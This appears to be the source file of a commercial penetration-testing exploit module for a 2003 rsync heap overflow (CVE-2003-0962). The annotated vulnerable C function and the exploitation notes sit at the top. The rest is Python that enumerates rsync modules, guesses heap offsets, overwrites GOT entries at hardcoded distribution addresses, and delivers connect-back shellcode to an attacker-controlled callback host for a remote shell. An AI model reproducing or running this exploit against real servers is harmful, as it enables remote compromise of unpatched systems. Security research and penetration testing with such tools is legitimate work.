#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""

rsync.py

"""

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

DOCUMENTATION={}
docnotes ="This exploit only gets root in odd circumstances, like "
docnotes+="debian.org's way of not using chroot and uid=nobody "
docnotes+="or simply not using chroot and having a kernel bug. I can't remember."
docnotes+="in any case, if uid=0 is set in rsync.conf, then this exploit will"
docnotes+="be able to break chroot and get a shell. Otherwise, rsync drops privs, "
docnotes+="so it won't be able to get a shell and will appear to fail."
DOCUMENTATION["Notes"]=docnotes

NAME="rsync"
VERSION="1.0"
NOTES="""


static struct sum_struct *receive_sums(int f) {

    s = (struct sum_struct *)malloc(sizeof(*s));
    s->count = read_int(f);
    s->n = read_int(f);
    s->remainder = read_int(f); 
    s->sums = NULL;
    
    s->sums = (struct sum_buf *)malloc(sizeof(s->sums[0])*s->count); <-- integer overflow here
    
    for (i=0; i < (int) s->count;i++) {   <--- loop controlled by us
        s->sums[i].sum1 = read_int(f);     
        read_buf(f,s->sums[i].sum2,csum_length);

        s->sums[i].offset = offset;
        s->sums[i].i = i;

        if (i == (int) s->count-1 && s->remainder != 0) {
            s->sums[i].len = s->remainder;
        } else {
            s->sums[i].len = s->n;
        }
        offset += s->sums[i].len;
    }

Note on reliability:

"I see an extraneous "ff ff ff ff" in the header being sent that is not in a normal rsync traffic.  
Is that extra padding, implementation specific, or does it actually try to mess with the total 
file length field.  The four bytes in the 'chunks number' field is what's getting overflowed I
 thought, which makes the positioning of the ff ff ff ff curious."

That "extra" \xff\xff\xff\xff its a cool trick that we found when wrote rsync exploit.

The vulnerable function (receive_sums) is called by send_files(). Before calling receive_sums, it 
received an integer and check if its -1 (0xFFFFFFFF), if that is correct and rsync protocol 
version is > 13, then csum_length value changed to SUM_LENGTH, and this would give us more 
continuous buffer to be writen on our target.
                                                                                
                                                                                
"""

CHANGELOG="""
1.0 
Created.
"""

DEBUGNOTES="""
    
"""

import sys
sys.path.append(".")
sys.path.append("../../")

import socket
from exploitutils import *

from tcpexploit import tcpexploit
from encoder import chunkize

import time, struct # REMOVE STRUCT WHEN I LEARN HOW TO USE CANVAS STUFF

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Samba"
DOCUMENTATION["Affected"]="rsync prior to 2.5.7 (rsync.samba.org)"
DOCUMENTATION["Date Public"]="10/4/2003"
DOCUMENTATION["Patch"]="http://samba.org/ftp/rsync/old-patches/rsync-2.5.6-2.5.7.diffs.gz"
DOCUMENTATION["NOTE"]="Because of some of the steps taken in this exploit to make it reliable, this exploit might takes several minutes to complete"
DOCUMENTATION["CVE Name"] = "CVE-2003-0962"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0962"
DOCUMENTATION['CVSS'] = 7.5

DESCRIPTION="Rsync Heap Overflow"

VERSION="0.1"

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Linux", "x86"] ]


NOTES=""" 

"""

CHANGELOG="""

"""


# For future enhancement of the protocol
SAME_MODE =(1<<1)
SAME_RDEV =(1<<2)
SAME_UID  =(1<<3)
SAME_GID  =(1<<4)
SAME_DIR  =(1<<5)
SAME_NAME =SAME_DIR
LONG_NAME =(1<<6)
SAME_TIME =(1<<7)
S_IFMT    =00170000
S_IFLNK   =0120000

class theexploit(tcpexploit):
    SUM_LENGTH=16
    SUM_BUFSZ=36
    #      debian   redhat     mandrake?
    gots=[0x8074318,0x8071254, 0x8077388 ]

    def __init__(self):
        tcpexploit.__init__(self)
        
        self.setPort(873)
        self.setHost("")
        self.setVersion(0)
        self.badstring=""
        self.searchbadstring="\x00\\/.:$"
        self.istest=0
        self.setVersions()
        self.shellcode="A"
        self.localhost=""
        self.targetmodule=""
        self.localport=5555
        self.backdoor=6969 # Backdoor Port
        self.aas=1
        self.ssl=0
        self.sock=None
        self.name=NAME
        return
    
    def neededListenerTypes(self):
        from canvasengine import LINUXMOSDEF
        return [LINUXMOSDEF]

    def createShellcode(self):
        localhost = self.callback.ip
        localport = self.callback.port
        # special case, using chunksize coder
        self.remoteport=localport
        from shellcode import shellcodeGenerator
        myshellcode=shellcodeGenerator.linux_X86()
        myshellcode.addAttr("connect",{"ipaddress" : localhost, "port": localport})
        myshellcode.addAttr("read_and_exec",{"fdreg": "esi"})
        myshellcode.get()
        code=myshellcode.getcode()
        self.shellcode = chunkize.chunkize(code , 20,16)    
        return 1 # + "exit:\n"

    
    def test(self):
        self.host = self.target.interface
        self.port = int(self.argsDict["port"])

        self.log("Running rsync test against %s:%d"%(self.host,self.port))
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))        
        except:
            self.log("Couldn't connect to the server")
            return
        self.sock=s
        v=self.welcome()
        if v != 0:
                self.log("rsync version: %d" % v)
                
        self.setVersion(1)
        s.close()
        return 1

    def get_module(self):
        self.log("Trying to find a suitable module")
        modules=[]
        try:
            s = self.gettcpsock() # (socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            self.sock=s
            s.set_timeout(10)
        except:	
            self.log("Attack reported no open socket - service died?")
            return ""
        if not self.welcome():
            return ""
        
        s.send("\n")
        time.sleep(1)
        buf=s.recv(1000)
        buf=buf.split("\n")
        for line in buf:
            if line and  line[0]=="@":
                continue
            modules.append( line.split("\t")[0].strip() )
        s.close()
        for m in modules:
            try:
                s = self.gettcpsock() # socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, self.port))
                self.sock=s
            except:	
                self.log("Attack reported no open socket - service died?")
                return ""
            if not self.welcome():
                s.close()
                continue
            if self.module(m):
                self.log("Module found: %s" % m)
                s.close()
                return m
        return ""
            
    # welcome message
    # <- returns server version
    def welcome(self):
        s=self.sock
        ver=0
        buf=s.recv(25)
        buf=buf.strip()
        idx=buf.find("@RSYNCD:") 
        if idx != -1:
            try:
                ver=int(buf[idx+9:].strip())
                s.send("@RSYNCD: 26\n")
            except ValueError:
                self.log("Bad welcome message (%s) "% str(buf))
                return None                
        return ver

    # module to work on
    # <- server answer
    def module(self, module):
        s=self.sock
        s.send(module + "\n")
        buf=s.recv(25)
        buf=buf.strip().split(" ")
        if buf[0]=="@RSYNCD:":
            return buf[1]
        else:
            #self.log("Bad Answer to module request (%s)" % str(buf))
            return None

    # send arguments
    # <- return checksum
    def sendArgv(self, argv):
        s=self.sock
        for a in argv:
            s.send(a+"\n")
        s.send("\n")

        checksum=s.recv(4) # checksum_seed
        checksum,=struct.unpack("<i", checksum)
        return checksum
        # exclude list

    def sendExclude(self):
        self.sock.send(struct.pack("<i", 0)) # no exclude (?!)

    def setOffset(self, offset):
            self.offset= offset

    def receiveFiles(self):
        s=self.sock
        if 0:
            files=[]
        while 0:
            flag,=struct.unpack("B", s.recv(1))
            print str(flag) +")",
            if flag==0:
                break
            namesz,=struct.unpack("B", s.recv(1))
            name=s.recv(namesz)
            print name, namesz
            length,=struct.unpack("<L", s.recv(4))
            f=rsyncFile(name,flag, length)
            if(flag & ~SAME_TIME):
                f.modtime,=struct.unpack("<L", s.recv(4))
            if(flag & ~SAME_MODE):
                f.mode,=struct.unpack("<L", s.recv(4))
            print hex(f.mode)
            files.append(f)
        s.recv(5000)

    def sendStuff(self, got, size):
        """ 
        struct sum_struct {
            OFF_T flength;          /**< total file length */
            size_t count;           /**< how many chunks */
            size_t remainder;       /**< flength % block_length*/
            size_t n;               /**< block_length */
            struct sum_buf *sums;   /**< points to info for each chunk */
        };
        
        sizeof(struct sum_buf) = 36
        
        struct sum_buf {
            /* HOLE */
            OFF_T offset;           /**< offset in file of this chunk */
            /* filled with s->n */
            int len;                /**< length of chunk of file */
            /* HOLE */
            int i;                  /**< index of this chunk */        /* filled */
            /* filled */
            uint32 sum1;            /**< simple checksum */
            /* filled */
            char sum2[SUM_LENGTH];  /**< checksum  */
        };

        for (i=0; i < (int) s->count;i++) {
        s->sums[i].sum1 = read_int(f);
        read_buf(f,s->sums[i].sum2,csum_length);
        s->sums[i].offset = offset;
        s->sums[i].i = i;
        if (i == (int) s->count-1 && s->remainder != 0) {
                s->sums[i].len = s->remainder; 
        } else {
                s->sums[i].len = s->n;  <-- this will work 
        }

        }

        Steps:
                - Figure out in that part of the code, s->sums pointer get
                    overwritten
                - Try to get the EXACT address where our nice crafted will be
                - overwrite everything with pointer to shellcode
        Note:
                sums is an array like: s->sums[i], so we have to 
                substracted i * sizeof(struct smb_buf) to write on our exact 
                point. (make some padding, if its necessary)
        """
        a=0
        s=self.sock

        offset=self.offset
        # get bytes to the target (must be swiss precision):
        # 20 are the byte actually written per sum_buf structure
        first=offset / self.SUM_BUFSZ * 20
        resto= offset % self.SUM_BUFSZ
        many=0

        # We have chunks of 36 bytes (struct sum_buf)
        # and from that 36 bytes, we can only write 20 bytes like this:
        # ------------
        # | offset 8b|  <- hole
        # -----------|
        # | len      |  <- len (cames from s->n) pseudo-hole
        # ------------
        # | i        |  <- hole
        # ------------
        # | sum1     |  <- we can write it
        # ------------  
        # | sum2 16b |  <- we can write it 
        # ------------
        # So, once we have our buffer, we have to be SURE where our buffer
        #  on "got" location will be positioned

        
        if resto>= 16 and resto < self.SUM_BUFSZ:
            many+= resto-12
        
        got_addr=struct.pack("<L", (got -  (offset) ) )

        
        # so... to get into the target we have:
        # offset/ SUM_LENGTH
        s.send(struct.pack("<L", 0xffffffffL))
        s.send(struct.pack("<L", 0))
        s.send(struct.pack("<L", 0x40000000))
        s.send(got_addr*2) 	     # n+remainder
        #s.send(struct.pack("<L", 0x41414141)) # n
        #s.send(struct.pack("<L", 0x41414141)) # remainder
        
        buf = got_addr * ((first+many)/4 +5) 

        s.send(buf)
        
        if many:
            many=self.SUM_BUFSZ
        many+=0x10
        shellcode_loc=struct.pack("<L", (got+ many+0x24)) # Add another 36 to
                                    # to get to shellcode
        
        buf= self.shellcode 

        buf+=shellcode_loc* size 
        try:
                s.send(buf[:offset+0x20])
        except:
                # Sounds like the offset its not working or erroneous GOT
                s.close()
                return 0
        try:
            s.send(buf[offset+0x20:])
        except:
            # it might be an erroneous got, let it pass
            pass
        
        s.close()
        return 1

    # Disclaimer:
    #   By reading this function, you are stating that right now you are 
    #    above 18 years of age, that it is legal for you to view nasty code
    #    where you live, that you are reading this function of your own free will
    #    because you want to view it's contents for personal enjoyment, that 
    #    you will not use any of the contents for the purpose of entrapment, 
    #    and that you have read, understand and are legally bound by this agreement.
    def testSend(self, size):
        s=self.sock
        
        s.send(struct.pack("<L", 0xffffffffL))
        s.send(struct.pack("<L", 0))
        s.send(struct.pack("<L", 0x40000000))
        s.send(struct.pack("<L", 0x41414141)) # n
        s.send(struct.pack("<L", 0x41414141)) # remainder
        i=0
        buf="A" * size
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 20)
        while i < len(buf):
                try:
                    s.send( buf[i:i+4] )
                except socket.error,msg:						
                    s.close()
                    return ( i/20*36 )
                i+=4	
                try:
                        s.send( buf[i:i+16] )
                except:
                    s.close()
                    return  (i/20*36 )
                i+=16
        s.close()
        return i
    
    def guessOffset(self, m):
        a=0
        #self.log("Chill out, this might take some time")
        for a in range(0, 1):
            try:
                s = self.gettcpsock() # socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, self.port))
                s.set_timeout(40)
                self.sock=s
            except:	
                self.log("Attack reported no open socket - service died?")
                return 0
            if not self.welcome():
                return None
            #        return None
            if not self.module(m):
                return None
            
            self.sendArgv(["--server", "--sender", ".", m + "/" + "*" *self.aas, m+"/"+"." * 8 ])
            self.sendExclude()
            self.receiveFiles()
            off=self.testSend(0xffff)
            self.log("  [+] Guessed offset (%x): " % off)

        return off
    
    def run(self):
        self.host = self.target.interface
        self.port = int(self.argsDict["port"])

        if "module" in self.argsDict:
            self.setTargetModule(self.argsDict["module"])
        else:
            self.setTargetModule("")

        if "length" in self.argsDict:
            self.setLength(int(self.argsDict["length"]))

        self.setInfo("%s attacking %s:%d" % (NAME, self.host, self.port) )
        if self.version==0:
            if self.test()==0:
                self.log("Not continuing since test failed to set version")
                return 0
        #self.set_shellcode()

        shellfd=self.exploitIT()
        if shellfd:
            self.setInfo("%s attacking %s:%d - done (success!)" % (NAME, self.host, self.port) )
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port) )
        return 0
            
    def exploitIT(self):
        # CHANGE: ask the guys how can I ask for a "module" (default: "ftp")
        print "TARGET: %s" % self.targetmodule
        if self.targetmodule:
            m=self.targetmodule
        else:
            m=self.get_module()
            if not m:
                self.log("We are not allow to access any module")
                return None
                
        # Go through every "possible got" (we could join this together if we could get
        # get an universal got, but thats kind of impossible. Stack might be a possibility
        # but i dont trust on stack.
        for pgot in self.gots:
            # As you know, if you read source code, we have some holes in what we write
            # so, change this value will allow us to give on the exact GOT slot that
            # we like to overwrite
            #print "GOT A GOT: %s" % hex(pgot)
            for offset in range(0, 20, 4): 
                got=pgot-0x100-len(self.shellcode)+offset
                # LAST: got=pgot-0x100+offset
                # We change our heap layout, multiplying "*" (self.aas) in
                # self.Argv(... module+"/"+ "*" self.aas)
                # I put this, because sometimes our &sums->buf its has a higher
                # address than &s 
                for he in [100, 1,20,50,75]:
                    self.aas=he

                    self.log("[+] Changing Heap Layout (%d)" % self.aas)
                    # CHANGE THIS:
                    off=self.guessOffset(m)
                    if not off:
                        return 0
                    #print "Enter a key to continue:", sys.stdin.read(1)
            
                    #if not off:
                    #	return 0
                    #if not self.sendAttack(off+0x40, m):
                    #	continue
                    #off=0x4c8
                    self.sendAttack(got, off, m)
                    p=self.ISucceeded()
                    if p:
                        return 1
                    
                    # Finally, our last loop :D
                    # Offset detection have a precision of +-0x30
                    for z in range(4, 0x40, 8):
                        self.sendAttack(got, off-z, m)
                        p=self.ISucceeded()
                        if p:
                            return 1
                        self.sendAttack(got, off+z, m)
                        p=self.ISucceeded()
                        if p:
                            return 1
        return 0
    
    def sendAttack(self, got, offset, m):
        self.log("    [*] Trying to exploit (%s) with offset: 0x%x" % (self.host, offset))	
        try:
            s = self.gettcpsock() # socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            s.set_timeout(40)
            self.sock=s
            
        except:
            self.log("Attack %d reported no open socket - service died?"%i)
            return 0
        sploitstring=self.makesploit()
        #nico start
        if not self.welcome():
            return None
        if not self.module(m):
            None
        #print "WAIT"
        #sys.stdin.read(1)
        self.sendArgv(["--server", "--sender", ".", m + "/" + "*" *self.aas, m+"/"+"." * 8 ])
        self.sendExclude()
        self.receiveFiles()
        
        self.setOffset(offset)	

        return self.sendStuff(got, 0x2480)
        
    
    def setVersions(self):
        self.versions={}
        #version array: name 
        self.versions[1]=("Linux", 0x01020304) 
        
    def setTargetModule(self, m):
        self.targetmodule=m
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
            
    
    def makesploit(self):
        #self.log("Attacking version %s"%self.versions[self.version][0])
        packet="A"
        return packet
        
    def usage(self):
        app = theexploit()
        print "Usage: "+sys.argv[0]+" [-T] [-O module:modulename] -t target [-p targetport (%d)] -l localip -d localport"%(app.port)
        print "\t-T   test target version"
        print "\tDo not set a modulename to find a usable target"


if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)
